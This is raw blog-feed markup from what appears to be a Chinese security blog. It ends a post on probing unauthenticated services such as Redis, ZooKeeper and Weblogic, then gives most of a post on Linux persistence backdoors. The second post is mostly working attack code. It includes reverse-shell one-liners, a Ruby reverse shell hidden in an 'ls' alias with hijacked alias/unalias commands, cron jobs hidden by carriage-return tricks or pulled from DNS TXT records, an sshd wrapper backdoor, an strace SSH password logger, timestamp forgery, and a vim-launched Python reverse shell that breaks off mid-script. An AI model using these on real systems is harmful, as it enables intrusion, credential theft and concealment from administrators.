<h4 id="16-MongoDB-未授权访问"><a href="#16-MongoDB-未授权访问" class="headerlink" title="16. MongoDB 未授权访问"></a>16. MongoDB 未授权访问</h4><p><strong>漏洞简介</strong><br>开启MongoDB服务时不添加任何参数时,默认是没有权限验证的,登录的用户可以通过默认端口无需密码对数据库任意操作（增、删、改、查高危动作）而且可以远程访问数据库。<br>造成未授权访问的根本原因就在于启动 Mongodb 的时候未设置 –auth （默认空口令）<br><strong>漏洞检测</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mongo --host ip --port 27017</span><br></pre></td></tr></table></figure>
<h4 id="17-Memcached-未授权访问"><a href="#17-Memcached-未授权访问" class="headerlink" title="17. Memcached 未授权访问"></a>17. Memcached 未授权访问</h4><p><strong>漏洞简介</strong><br>Memcached 端口对外开放并且没有配置认证选项，未授权用户可直接获取数据库中所有信息，造成严重的信息泄露<br><strong>漏洞检测</strong><br>无需用户名密码，直接连接memcache 服务的11211端口，连接后使用 stats 命令来输出 Memcached 服务信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">telnet ip 11211 或 nc -vv ip 11211</span><br></pre></td></tr></table></figure>
<h4 id="18-NFS-未授权访问"><a href="#18-NFS-未授权访问" class="headerlink" title="18. NFS 未授权访问"></a>18. NFS 未授权访问</h4><p><strong>漏洞简介</strong><br>服务器在启用nfs服务以后，由于nfs服务未限制对外访问，导致共享目录泄漏<br><strong>默认端口</strong>：2049&#x2F;20048<br><strong>漏洞检测</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#查看nfs服务器上的共享目录</span><br><span class="line">showmount -e ip </span><br><span class="line"></span><br><span class="line">#挂载相应共享目录到本地</span><br><span class="line">mount -t nfs ip:/grdata /mnt </span><br><span class="line"></span><br><span class="line">#卸载目录</span><br><span class="line">umount /mnt</span><br></pre></td></tr></table></figure>
<h4 id="19-Rsync-未授权访问"><a href="#19-Rsync-未授权访问" class="headerlink" title="19. Rsync 未授权访问"></a>19. Rsync 未授权访问</h4><p><strong>漏洞简介</strong><br>Rsync默认运行在873端口。由于配置不当，导致任何人可未授权访问rsync，上传本地文件，下载服务器文件；rsync未授权访问危害主要有两个：一是造成了严重的信息泄露；二是上传脚本后门文件，远程命令执行<br><strong>漏洞检测</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1) 列出目标服务器的同步目录</span><br><span class="line">rsync ip::</span><br><span class="line">rsync rsync://ip:873</span><br><span class="line"></span><br><span class="line">2) 查看模块文件</span><br><span class="line"></span><br><span class="line">rsync rsync://ip:873/moudle</span><br><span class="line"></span><br><span class="line">3) 下载上传文件</span><br><span class="line">下载：rsync -av ip::src/路径 文件路径</span><br><span class="line">上传：rsync -av 文件路径 rsync://ip:873/目标系统文件路径</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="20-Redis-未授权访问"><a href="#20-Redis-未授权访问" class="headerlink" title="20. Redis 未授权访问"></a>20. Redis 未授权访问</h4><p><strong>漏洞简介</strong><br>redis是一个数据库，默认端口是6379，redis默认是没有密码验证的，可以免密码登录操作，攻击者可以通过操作redis进一步控制服务器<br>Redis未授权访问在4.x&#x2F;5.0.5以前版本下，可以使用master&#x2F;slave模式加载远程模块，通过动态链接库的方式执行任意命令<br><strong>漏洞检测</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1) 使用redis-cli命令直接远程免密登录redis主机</span><br><span class="line"></span><br><span class="line">redis-cli -h 目标主机IP</span><br><span class="line"></span><br><span class="line">2) 连接后执行命令ping，如返回响应PONG，则存在漏洞</span><br></pre></td></tr></table></figure>
<h4 id="21-RabbitMQ-未授权访问"><a href="#21-RabbitMQ-未授权访问" class="headerlink" title="21. RabbitMQ 未授权访问"></a>21. RabbitMQ 未授权访问</h4><p><strong>漏洞检测</strong><br>默认账号密码为guest</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://ip:15672</span><br><span class="line">http://ip:25672/</span><br><span class="line">http://ip:15692/</span><br></pre></td></tr></table></figure>
<h4 id="22-Solr-未授权访问"><a href="#22-Solr-未授权访问" class="headerlink" title="22. Solr 未授权访问"></a>22. Solr 未授权访问</h4><p><strong>漏洞简介</strong><br>Solr是一个高性能，采用Java开发，基于Lucene的全文搜索服务器。solr的管理界面通常包含如下信息：solr的配置信息（包括路径，用户名，系统版本信息），数据库的配置信息（地址，用户名，密码），数据库搜索数据等。<br>solr未授权访问的危害很大，轻则可查询所有数据库信息，重则可读取系统任意文件，甚至getshell<br><strong>漏洞检测</strong><br>敏感目录扫描时加上 &#x2F;solr&#x2F;admin</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://xx.xx.com/solr/admin</span><br><span class="line">https://xx.xx.com/solr/admin</span><br></pre></td></tr></table></figure>
<h4 id="23-SpringBoot-Actuator-未授权访问"><a href="#23-SpringBoot-Actuator-未授权访问" class="headerlink" title="23. SpringBoot Actuator 未授权访问"></a>23. SpringBoot Actuator 未授权访问</h4><p><strong>漏洞简介</strong><br>Actuator 是 springboot 提供的用来对应用系统进行自省和监控的功能模块，借助于 Actuator 开发者可以很方便地对应用系统某些监控指标进行查看、统计等。<br>在 Actuator 启用的情况下，如果没有做好相关权限控制，非法用户可通过访问默认的执行器端点（endpoints）来获取应用系统中的监控信息，从而导致信息泄露甚至接管服务器<br><strong>漏洞检测</strong><br>访问敏感路径: <code>http://ip/path</code></p>
<table>
<thead>
<tr>
<th><strong>请求方式</strong></th>
<th><strong>URL路径</strong></th>
<th><strong>功能描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td>get</td>
<td>&#x2F;autoconfig</td>
<td>提供了一份自动配置报告，记录哪些自动配置条件通过了，哪些没通过</td>
</tr>
<tr>
<td>get</td>
<td>&#x2F;configprops</td>
<td>描述配置属性（包含默认值）如何注入 Bean</td>
</tr>
<tr>
<td>get</td>
<td>&#x2F;beans</td>
<td>描述应用程序上下文里全部的 Bean，以及它们的关系</td>
</tr>
<tr>
<td>get</td>
<td>&#x2F;dump</td>
<td>获取线程活动的快照</td>
</tr>
<tr>
<td>get</td>
<td>&#x2F;env</td>
<td>获取全部环境属性</td>
</tr>
<tr>
<td>get</td>
<td>&#x2F;env&#x2F;{name}</td>
<td>根据名称获取特定的环境属性值</td>
</tr>
<tr>
<td>get</td>
<td>&#x2F;health</td>
<td>报告应用程序的健康指标，这些值由 HealthIndicator 的实现类提供</td>
</tr>
<tr>
<td>get</td>
<td>&#x2F;info</td>
<td>获取应用程序的定制信息，这些信息由 info 打头的属性提供</td>
</tr>
<tr>
<td>get</td>
<td>&#x2F;mappings</td>
<td>描述全部的 URI 路径，以及它们和控制器（包含 Actuator 端点）的映射关系</td>
</tr>
<tr>
<td>get</td>
<td>&#x2F;metrics</td>
<td>报告各种应用程序度量信息，比如内存用量和 HTTP 请求计数</td>
</tr>
<tr>
<td>get</td>
<td>&#x2F;metrics&#x2F;{name}</td>
<td>报告指定名称的应用程序度量值</td>
</tr>
<tr>
<td>post</td>
<td>&#x2F;shutdown</td>
<td>关闭应用程序，要求 endpoints.shutdown.enabled 设置为 true（默认为 false）</td>
</tr>
<tr>
<td>get</td>
<td>&#x2F;trace</td>
<td>提供基本的 HTTP 请求跟踪信息（时间戳、HTTP 头等）</td>
</tr>
</tbody></table>
<h4 id="24-Spark-未授权访问"><a href="#24-Spark-未授权访问" class="headerlink" title="24. Spark 未授权访问"></a>24. Spark 未授权访问</h4><p><strong>漏洞简介</strong><br>Apache Spark是一款集群计算系统，其支持用户向管理节点提交应用，并分发给集群执行。如果管理节点未启动ACL（访问控制），我们将可以在集群中执行任意代码。该漏洞本质是未授权的用户可以向管理节点提交一个应用，这个应用实际上是恶意代码<br><strong>漏洞检测</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1) nmap探测</span><br><span class="line"></span><br><span class="line">6066/tcp  open  http           Jetty 9.3.z-SNAPSHOT</span><br><span class="line">8081/tcp  open  http           Jetty 9.3.z-SNAPSHOT</span><br><span class="line">8082/tcp  open  http           Jetty 9.3.z-SNAPSHOT</span><br><span class="line"></span><br><span class="line">2) msf利用</span><br><span class="line"></span><br><span class="line">msf5&gt;use exploit/linux/http/spark_unauth_rce</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="25-VNC-未授权访问"><a href="#25-VNC-未授权访问" class="headerlink" title="25. VNC 未授权访问"></a>25. VNC 未授权访问</h4><p><strong>漏洞简介</strong><br>VNC 是虚拟网络控制台Virtual Network Console的英文缩写，是一款优秀的远程控制工具软件。VNC 默认端口号为 5900、5901。VNC 未授权访问漏洞如被利用可能造成恶意用户直接控制受控主机<br><strong>漏洞检测</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1) msf检测</span><br><span class="line"></span><br><span class="line">auxiliary/scanner/vnc/vnx_none_auth</span><br><span class="line"></span><br><span class="line">2）vncviewer命令连接主机</span><br><span class="line"></span><br><span class="line">vncviewer ip</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="26-Weblogic-未授权访问"><a href="#26-Weblogic-未授权访问" class="headerlink" title="26. Weblogic 未授权访问"></a>26. Weblogic 未授权访问</h4><p><strong>漏洞简介</strong><br>Weblogic是Oracle公司推出的J2EE应用服务器，CVE-2020-14882允许未授权的用户绕过管理控制台的权限验证访问后台，CVE-2020-14883允许后台任意用户通过HTTP协议执行任意命令。使用这两个漏洞组成的利用链，可通过一个GET请求在远程Weblogic服务器上以未授权的任意用户身份执行命令<br><strong>漏洞检测</strong><br>访问 <code>http://ip:7001/console</code> 即可查看到后台登录页面<br>weblogic权限绕过（CVE-2020-14882）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">构造特殊请求的URL，即可未授权访问到管理后台页面</span><br><span class="line"></span><br><span class="line">http://ip:7001/console/css/%252e%252e%252fconsole.portal</span><br></pre></td></tr></table></figure>
<h4 id="27-ZooKeeper-未授权访问"><a href="#27-ZooKeeper-未授权访问" class="headerlink" title="27. ZooKeeper 未授权访问"></a>27. ZooKeeper 未授权访问</h4><p><strong>漏洞简介</strong><br>ZooKeeper 默认开启在 2181 端口在未进行任何访问控制的情况下攻击者可通过执行 envi 命令获得系统大量的敏感信息包括系统名称Java 环境，任意用户在网络可达的情况下进行为未授权访问并读取数据甚至 kill 服务<br><strong>漏洞检测</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo envi | nc ip port          #获取服务器环境信息</span><br><span class="line">echo stat | nc ip port          #获取性能和连接的客户端的统计信息</span><br><span class="line">echo ruok | nc ip port          #测试服务器是否运行在非错误状态</span><br><span class="line">echo reqs | nc ip port          #列出未完成请求</span><br><span class="line">echo dump | nc ip port          #列出未完成的会话和临时节点</span><br></pre></td></tr></table></figure>
<h4 id="28-Zabbix-未授权访问"><a href="#28-Zabbix-未授权访问" class="headerlink" title="28. Zabbix 未授权访问"></a>28. Zabbix 未授权访问</h4><p><strong>漏洞简介</strong><br>zabbix是一款服务器监控软件，默认服务开放端口为10051，其由server、agent、web等模块组成，其中web模块由PHP编写，用来显示数据库中的结果<br><strong>漏洞检测</strong><br>无需账户密码直接访问zabbix页面</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://ip:port/zabbix.php</span><br></pre></td></tr></table></figure>

<hr>
<center>本文涉及内容，仅限于网络安全从业者学习交流，切勿用于非法用途...



</center>]]></content>
      <categories>
        <category>漏洞研究</category>
      </categories>
      <tags>
        <tag>Vulner</tag>
        <tag>Execution</tag>
      </tags>
  </entry>
  <entry>
    <title>权限维持Linux后门篇</title>
    <url>/posts/20809/</url>
    <content><![CDATA[<center>本文记录Linux环境下权限维持思路及方法...</center>

<span id="more"></span>
<hr>
<h2 id="0x01-Metasploit"><a href="#0x01-Metasploit" class="headerlink" title="0x01 Metasploit"></a>0x01 Metasploit</h2><h3 id="1-Unix-中反弹shell的paylaod"><a href="#1-Unix-中反弹shell的paylaod" class="headerlink" title="1. Unix 中反弹shell的paylaod"></a>1. Unix 中反弹shell的paylaod</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -l payloads | grep &#x27;cmd/unix/reverse&#x27;</span><br><span class="line"></span><br><span class="line">    cmd/unix/reverse                                    Creates an interactive shell through two inbound connections</span><br><span class="line">    cmd/unix/reverse_awk                                Creates an interactive shell via GNU AWK</span><br><span class="line">    cmd/unix/reverse_bash                               Creates an interactive shell via bash&#x27;s builtin /dev/tcp. This will not work on circa 2009 and older Debian-based Linux distributions (including Ubuntu) because they compile bash without the /dev/tcp feature.</span><br><span class="line">    cmd/unix/reverse_bash_telnet_ssl                    Creates an interactive shell via mkfifo and telnet. This method works on Debian and other systems compiled without /dev/tcp support. This module uses the &#x27;-z&#x27; option included on some systems to encrypt using SSL.</span><br><span class="line">    cmd/unix/reverse_bash_udp                           Creates an interactive shell via bash&#x27;s builtin /dev/udp. This will not work on circa 2009 and older Debian-based Linux distributions (including Ubuntu) because they compile bash without the /dev/udp feature.</span><br><span class="line">    cmd/unix/reverse_jjs                                Connect back and create a command shell via jjs</span><br><span class="line">    cmd/unix/reverse_ksh                                Connect back and create a command shell via Ksh. Note: Although Ksh is often available, please be aware it isn&#x27;t usually installed by default.</span><br><span class="line">    cmd/unix/reverse_lua                                Creates an interactive shell via Lua</span><br><span class="line">    cmd/unix/reverse_ncat_ssl                           Creates an interactive shell via ncat, utilizing ssl mode</span><br><span class="line">    cmd/unix/reverse_netcat                             Creates an interactive shell via netcat</span><br><span class="line">    cmd/unix/reverse_netcat_gaping                      Creates an interactive shell via netcat</span><br><span class="line">    cmd/unix/reverse_nodejs                             Continually listen for a connection and spawn a command shell via nodejs</span><br><span class="line">    cmd/unix/reverse_openssl                            Creates an interactive shell through two inbound connections</span><br><span class="line">    cmd/unix/reverse_perl                               Creates an interactive shell via perl</span><br><span class="line">    cmd/unix/reverse_perl_ssl                           Creates an interactive shell via perl, uses SSL</span><br><span class="line">    cmd/unix/reverse_php_ssl                            Creates an interactive shell via php, uses SSL</span><br><span class="line">    cmd/unix/reverse_python                             Connect back and create a command shell via Python</span><br><span class="line">    cmd/unix/reverse_python_ssl                         Creates an interactive shell via python, uses SSL, encodes with base64 by design.</span><br><span class="line">    cmd/unix/reverse_r                                  Connect back and create a command shell via R</span><br><span class="line">    cmd/unix/reverse_ruby                               Connect back and create a command shell via Ruby</span><br><span class="line">    cmd/unix/reverse_ruby_ssl                           Connect back and create a command shell via Ruby, uses SSL</span><br><span class="line">    cmd/unix/reverse_socat_udp                          Creates an interactive shell via socat</span><br><span class="line">    cmd/unix/reverse_ssh                                Connect back and create a command shell via SSH</span><br><span class="line">    cmd/unix/reverse_ssl_double_telnet                  Creates an interactive shell through two inbound connections, encrypts using SSL via &quot;-z&quot; option</span><br><span class="line">    cmd/unix/reverse_stub                               Creates an interactive shell through an inbound connection (stub only, no payload)</span><br><span class="line">    cmd/unix/reverse_tclsh                              Creates an interactive shell via Tclsh</span><br><span class="line">    cmd/unix/reverse_zsh                                Connect back and create a command shell via Zsh. Note: Although Zsh is often available, please be aware it isn&#x27;t usually installed by default</span><br></pre></td></tr></table></figure>

<h3 id="2-msfvenom-生成payload"><a href="#2-msfvenom-生成payload" class="headerlink" title="2. msfvenom 生成payload"></a>2. msfvenom 生成payload</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p &lt;payload&gt; LHOST=&lt;LHOST&gt; LPORT=&lt;LPORT&gt; -f &lt;format&gt; -o &lt;path&gt;</span><br><span class="line"></span><br><span class="line">msfvenom -p &lt;payload&gt; -e &lt;encoder &gt; -i &lt;encoder times&gt; LHOST=&lt;LHOST&gt; LPORT=&lt;LPORT&gt; -f &lt;format&gt; -o &lt;path&gt;</span><br></pre></td></tr></table></figure>

<p>refer: <a href="https://gitee.com/l0n9/sec-notes/blob/master/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F/Metsploit%E5%9F%BA%E7%A1%80%E7%AF%87.md">https://gitee.com/l0n9/sec-notes/blob/master/Metsploit</a></p>
<h3 id="3-meterpreter-shell"><a href="#3-meterpreter-shell" class="headerlink" title="3. meterpreter shell"></a>3. meterpreter shell</h3><p>shell升级为 meterpreter shell</p>
<p>攻击机配置msf 监听：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"></span><br><span class="line">set payload linux/x86/shell/reverse_tcp</span><br><span class="line"></span><br><span class="line">set lport 6666</span><br><span class="line"></span><br><span class="line">set lhost 192.168.1.1</span><br><span class="line"></span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>目标主机上反弹shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rm -f /tmp/f; mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 192.168.1.1 6666 &gt; /tmp/f</span><br></pre></td></tr></table></figure>

<p>获取一个普通shell, 在这个shell中输入 background, 在对话中选择 y, 将shell放在了后台</p>
<p>使用 sessions -u 1 将普通shell提升为 meterpreter shell</p>
<p>sessions命令查看shell会话，sessions -i id 切换到目标shell</p>
<h2 id="0x02-计划任务后门"><a href="#0x02-计划任务后门" class="headerlink" title="0x02 计划任务后门"></a>0x02 计划任务后门</h2><h3 id="1-查找计划任务相关文件"><a href="#1-查找计划任务相关文件" class="headerlink" title="1. 查找计划任务相关文件"></a>1. 查找计划任务相关文件</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1) sudo find / -name &#x27;cron*&#x27; | egrep -v &#x27;man|doc&#x27; | sort -u</span><br><span class="line"></span><br><span class="line">2) sudo updatedb &amp;&amp; sudo locate cron | egrep -v &#x27;doc|man&#x27;</span><br></pre></td></tr></table></figure>

<h3 id="2-定时任务文件说明"><a href="#2-定时任务文件说明" class="headerlink" title="2. 定时任务文件说明"></a>2. 定时任务文件说明</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1) 用户允许/禁止配置文件</span><br><span class="line"></span><br><span class="line">- /etc/cron.deny ：用来禁止一些用户使用cron服务的配置文件</span><br><span class="line"></span><br><span class="line">- /etc/cron.allow ：允许一些用户来使用cron服务的配置文件，优先级高</span><br><span class="line"></span><br><span class="line">2) 系统配置项：系统执行的计划任务</span><br><span class="line"></span><br><span class="line">- /etc/crontab </span><br><span class="line"></span><br><span class="line">- /etc/cron.d/</span><br><span class="line"></span><br><span class="line">3) 用户配置项：执行crontab命令操作的目录</span><br><span class="line"></span><br><span class="line">- /var/spool/cron</span><br><span class="line"></span><br><span class="line">4) 其他计划任务文件</span><br><span class="line"></span><br><span class="line">    /etc/cron.daily</span><br><span class="line">    /etc/cron.deny</span><br><span class="line">    /etc/cron.hourly</span><br><span class="line">    /etc/cron.monthly</span><br><span class="line">    /etc/cron.weekly</span><br></pre></td></tr></table></figure>

<p>定时任务在线生成器：<a href="https://crontab.guru/">https://crontab.guru/</a></p>
<h3 id="3-计划任务隐藏后门"><a href="#3-计划任务隐藏后门" class="headerlink" title="3. 计划任务隐藏后门"></a>3. 计划任务隐藏后门</h3><p>隐藏思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1) 不使用用户cron配置项：避免crontab命令查看计划任务内容</span><br><span class="line"></span><br><span class="line">2) 不使用常用目录及文件如：/var/spool/cron、/etc/crontab等</span><br><span class="line"></span><br><span class="line">3) 劫持/修改系统默认的计划任务文件：伪装文件名/文件位置</span><br><span class="line"></span><br><span class="line">如：/etc/cron.daily 、/etc/cron.hourly目录下自带文件</span><br></pre></td></tr></table></figure>

<p>隐藏技巧</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1) 巧妙利用windows中的 \r（ Linux 中显示为M), 导致显示截断，从而隐藏真实的计划任务，使用crontab -e 可以看到</span><br><span class="line"></span><br><span class="line">(crontab -l;printf &quot;*/1 * * * * /root/.devops.sh;\rno crontab for `whoami`%100c\n&quot;)|crontab -</span><br><span class="line"></span><br><span class="line">2) 使用DNS的TXT记录，通过解析这个记录来进行执行，使用linux.org等公共域名进行隐藏</span><br><span class="line"></span><br><span class="line">0 1 * * * /bin/sh -c &quot;sh -c $(dig logging.chat TXT +short @pola.ns.cloudflare.com)&quot;</span><br></pre></td></tr></table></figure>

<p>refer：<a href="https://blog.sucuri.net/2019/05/cronjob-backdoors.html">https://blog.sucuri.net/2019/05/cronjob-backdoors.html</a></p>
<h2 id="0x03-SSH系列后门"><a href="#0x03-SSH系列后门" class="headerlink" title="0x03 SSH系列后门"></a>0x03 SSH系列后门</h2><h3 id="1-软链接后门"><a href="#1-软链接后门" class="headerlink" title="1. 软链接后门"></a>1. 软链接后门</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oPort=6666;</span><br><span class="line"></span><br><span class="line">ssh root@x.x.x.x -p 6666</span><br></pre></td></tr></table></figure>

<h3 id="2-SSH-Wapper-后门"><a href="#2-SSH-Wapper-后门" class="headerlink" title="2. SSH Wapper 后门"></a>2. SSH Wapper 后门</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /usr/sbin/</span><br><span class="line">mv sshd ../bin</span><br><span class="line">vim sshd //编辑sshd内容为以下</span><br><span class="line"></span><br><span class="line">#!/usr/bin/perl</span><br><span class="line">exec&quot;/bin/sh&quot; if(getpeername(STDIN)=~/^..0V/); // \x00\x000V是22222的大端形式</span><br><span class="line">exec&#123;&quot;/usr/bin/sshd&quot;&#125;&quot;/usr/sbin/sshd&quot;,@ARGV;</span><br><span class="line"></span><br><span class="line">重启sshd</span><br><span class="line">service sshd restart</span><br><span class="line"></span><br><span class="line">本机执行</span><br><span class="line">socat STDIO TCP4:127.0.0.1:22,sourceport=22222</span><br><span class="line"></span><br><span class="line">修改源端口</span><br><span class="line">import struct</span><br><span class="line">buffer = struct.pack(&#x27;&gt;I&#x27;,22222)</span><br><span class="line">print(buffer)</span><br></pre></td></tr></table></figure>

<h3 id="3-SSH公钥后门"><a href="#3-SSH公钥后门" class="headerlink" title="3. SSH公钥后门"></a>3. SSH公钥后门</h3><p>攻击机中使用 ssh-keygen -t rsa 生成公私钥</p>
<p>将公钥 id_rsa.pub 上传到目标主机，保存为 ~&#x2F;.ssh&#x2F;authorized_keys</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh user@host</span><br></pre></td></tr></table></figure>

<h3 id="4-SSH-Keylogger"><a href="#4-SSH-Keylogger" class="headerlink" title="4. SSH Keylogger"></a>4. SSH Keylogger</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 利用strace工具获取ssh的读写连接的数据，以达到抓取管理员登陆其他机器的明文密码</span><br><span class="line">alias ssh=&#x27;strace -o /tmp/.sshpwd-`date &#x27;+%d%h%m%s&#x27;`.log -e read.write.connect -s 2048 ssh&#x27;</span><br><span class="line"></span><br><span class="line">grep &quot;read(5&quot; /tmp/.sshpwdxxxxxxxx.log</span><br></pre></td></tr></table></figure>

<h2 id="0x04-alias后门"><a href="#0x04-alias后门" class="headerlink" title="0x04 alias后门"></a>0x04 alias后门</h2><h3 id="1-后门存放位置"><a href="#1-后门存放位置" class="headerlink" title="1. 后门存放位置"></a>1. 后门存放位置</h3><p>系统启动默认加载的配置文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1) /etc/profile</span><br><span class="line"></span><br><span class="line">【系统级】Linux是一个多用户操作系统。用户登录或切换（即Login shell 启动）时都有一个专用的运行环境，但首先执行 /etc/profile</span><br><span class="line"></span><br><span class="line">2) /etc/bashrc</span><br><span class="line"></span><br><span class="line">【系统级】在 bash shell 打开时运行，修改该文件配置的环境变量将会影响所有用户使用的bash shell</span><br><span class="line"></span><br><span class="line">3) ~/.bashrc</span><br><span class="line"></span><br><span class="line">【用户级】当用户登录时以及每次打开新的shell时该文件都将被读取，不推荐在这里配置用户专用的环境变量，因为每开一个shell，该文件都会被读取一次</span><br><span class="line"></span><br><span class="line">4) ~/.bash_profile &amp;&amp; ~./bash_login</span><br><span class="line"></span><br><span class="line">【用户级】</span><br><span class="line"></span><br><span class="line">如果有其中的一个文件存在的话, 当启动的是一个登录shell时，Bash 会执行该文件而不会执行~/.profile </span><br><span class="line"></span><br><span class="line">如果两个文件都存在的话，Bash 将会优先执行~/.bash_profile 而不是~/.bash_login </span><br><span class="line"></span><br><span class="line">5) ~/.bash_logout</span><br><span class="line"></span><br><span class="line">【用户级】当每次退出系统(退出bash shell)时执行该文件</span><br></pre></td></tr></table></figure>

<h3 id="2-后门制作"><a href="#2-后门制作" class="headerlink" title="2. 后门制作"></a>2. 后门制作</h3><p>当前用户目录下.bashrc</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alias ssh=&#x27;strace -o /tmp/sshpwd-`date &#x27;+%d%h%m%s&#x27;`.log -e read,write,connect -s 2048 ssh&#x27;</span><br></pre></td></tr></table></figure>

<p>创建alias后门</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1) 受控端创建别名</span><br><span class="line"></span><br><span class="line">alias ls=&quot;alerts()&#123; ls $* --color=auto;ruby -rsocket -e &#x27;exit if fork;c=TCPSocket.new(&quot;&#x27;&quot;&#x27;&quot;192.168.1.1&quot;&#x27;&quot;&#x27;&quot;,&quot;&#x27;&quot;&#x27;&quot;6666&quot;&#x27;&quot;&#x27;&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;&#x27;&quot;&#x27;&quot;r&quot;&#x27;&quot;&#x27;&quot;)&#123;|io|c.print io.read&#125;end&#x27;;&#125;;alerts&quot;</span><br><span class="line"></span><br><span class="line">2）攻击端监听本地端口</span><br><span class="line"></span><br><span class="line">nc -lvnp 6666</span><br><span class="line"></span><br><span class="line">3) 受控端执行别名命令，攻击端获得反弹shell</span><br></pre></td></tr></table></figure>

<h3 id="3-后门隐藏"><a href="#3-后门隐藏" class="headerlink" title="3. 后门隐藏"></a>3. 后门隐藏</h3><p>alias命令可以查看当前的别名，会让别名后门暴露。因此需要劫持alias命令，使输出中不显示后门指令。</p>
<p>另外unalias命令会清除别名，也需要对其进行劫持，避免后门指令的别名被清除。</p>
<p><strong>1）创建unalias别名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alias unalias=&#x27;alerts()&#123; if [ $# != 0 ]; then if [ $* != &quot;ls&quot; ]&amp;&amp;[ $* != &quot;alias&quot; ]&amp;&amp;[ $* != &quot;unalias&quot; ]; then unalias $*;else echo &quot;-bash: unalias: $&#123;*&#125;: not found&quot;;fi;else echo &quot;unalias: usage: unalias [-a] name [name ...]&quot;;fi;&#125;;alerts&#x27;</span><br></pre></td></tr></table></figure>

<p><strong>2) 创建alias的别名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">劫持前先将当前alias结果保存至比较隐蔽的文件</span><br><span class="line">alias &gt; /etc/gnupg/.gnupg</span><br><span class="line"></span><br><span class="line">alias alias=&quot;cat /etc/gnupg/.gnupg&quot;</span><br></pre></td></tr></table></figure>

<p><strong>3) 文件位置隐蔽</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1) 在正常的位置创建合理的文件</span><br><span class="line">vi /etc/yum/yum-update.rc  //创建文件，加入别名设置</span><br><span class="line"></span><br><span class="line">alias ls=&quot;alerts()&#123; ls $* --color=auto;ruby -rsocket -e &#x27;exit if fork;c=TCPSocket.new(&quot;&#x27;&quot;&#x27;&quot;192.168.1.1&quot;&#x27;&quot;&#x27;&quot;,&quot;&#x27;&quot;&#x27;&quot;6666&quot;&#x27;&quot;&#x27;&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;&#x27;&quot;&#x27;&quot;r&quot;&#x27;&quot;&#x27;&quot;)&#123;|io|c.print io.read&#125;end&#x27;;&#125;;alerts&quot;</span><br><span class="line"></span><br><span class="line">alias unalias=&#x27;alerts()&#123; if [ $# != 0 ]; then if [ $* != &quot;ls&quot; ]&amp;&amp;[ $* != &quot;alias&quot; ]&amp;&amp;[ $* != &quot;unalias&quot; ]; then unalias $*;else echo &quot;-bash: unalias: $&#123;*&#125;: not found&quot;;fi;else echo &quot;unalias: usage: unalias [-a] name [name ...]&quot;;fi;&#125;;alerts&#x27;</span><br><span class="line"></span><br><span class="line">alias alias=&quot;cat /etc/gnupg/.gnupg&quot;</span><br><span class="line"></span><br><span class="line">2) 将正常文件的时间复制给包含alias的文件</span><br><span class="line"></span><br><span class="line">touch -acmr version-groups.conf yum-update.rc</span><br></pre></td></tr></table></figure>

<h2 id="0x05-vim后门"><a href="#0x05-vim后门" class="headerlink" title="0x05 vim后门"></a>0x05 vim后门</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 适用于安装了vim且安装了python扩展(绝大版本默认安装)的linux系统,恶意脚本.py的内容可以是任何功能的后门</span><br><span class="line"></span><br><span class="line">cd /usr/lib/python2.7/site-packages &amp;&amp; $(nohup vim -E -c &quot;pyfile json.py&quot;&gt; /dev/null 2&gt;&amp;1 &amp;) &amp;&amp; sleep 2 &amp;&amp; rm -f json.py</span><br><span class="line"></span><br><span class="line">// 脚本代码</span><br><span class="line"></span><br><span class="line">import socket, subprocess, os;</span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);</span><br><span class="line">s.connect((&quot;192.168.121.1&quot;, 6666));</span><br><span class="line">os.dup2(s.fileno(), 0);</span><br><span class="line">os.dup2(s.fileno(), 1);</span><br><span class="line">os.dup2(s.fileno(), 2);</span><br><span class="line">p = subprocess.call([&quot;/bin/sh&quot;, 